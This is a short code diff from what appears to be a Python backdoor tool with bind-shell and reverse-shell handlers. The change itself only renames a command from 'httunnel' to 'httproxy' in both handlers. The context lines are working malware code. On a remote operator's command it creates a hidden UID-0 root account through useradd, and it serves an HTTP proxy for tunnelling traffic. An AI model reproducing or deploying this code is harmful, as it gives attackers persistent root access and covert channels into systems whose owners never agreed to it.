@@ -661,7 +661,7 @@ def bindShell():
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[+] Root account " + acct + " has been created.")
-        elif cmd == ("httunnel"):
+        elif cmd == ("httproxy"):
 	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
             conn.send("[+] Serving HTTP proxy on port %s" % HPORT)
 	    httpd.serve_forever()  
@@ -763,7 +763,7 @@ def reverseShell():
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[+] Root account " + acct + " has been created.")
-        elif cmd == ("httunnel"):
+        elif cmd == ("httproxy"):
 	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
             conn.send("[+] Serving HTTP proxy on port %s" % HPORT)
 	    httpd.serve_forever()  
